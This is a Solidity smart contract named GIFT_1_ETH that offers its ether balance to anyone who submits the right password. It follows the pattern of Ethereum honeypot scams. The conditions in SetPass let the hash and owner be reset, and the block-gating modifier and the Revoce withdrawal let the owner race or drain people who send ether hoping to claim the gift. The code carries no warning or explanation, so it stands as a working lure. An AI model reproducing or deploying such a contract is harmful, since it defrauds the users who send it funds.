1 pragma solidity ^0.4.19;
2 
3 contract GIFT_1_ETH
4 {
5     bytes32 public hashPass;
6     
7     address sender;
8 	
9 	bool passHasBeenSet = false;
10 	
11 	uint lastBlock;
12 	
13 	function() public payable{}
14     
15     function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}
16     
17     function SetPass(bytes32 hash)
18     public
19     payable
20     {
21         if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
22         {
23             hashPass = hash;
24             sender = msg.sender;
25         }
26         lastBlock = block.number;
27     }
28     
29     function GetGift(bytes pass)
30     external
31     payable
32     oneforblock
33     {
34         if(hashPass == keccak256(pass))
35         {
36             msg.sender.transfer(this.balance);
37         }
38     }
39     
40     function Revoce()
41     public
42     payable
43     oneforblock
44     {
45         if(msg.sender==sender)
46         {
47             sender.transfer(this.balance);
48         }
49     }
50     
51     function PassHasBeenSet(bytes32 hash)
52     public
53     {
54         if(msg.sender==sender&&hash==hashPass)
55         {
56            passHasBeenSet=true;
57         }
58     }
59     
60     modifier oneforblock
61     {
62         require(lastBlock<block.number);
63         _;
64     }
65     
66 }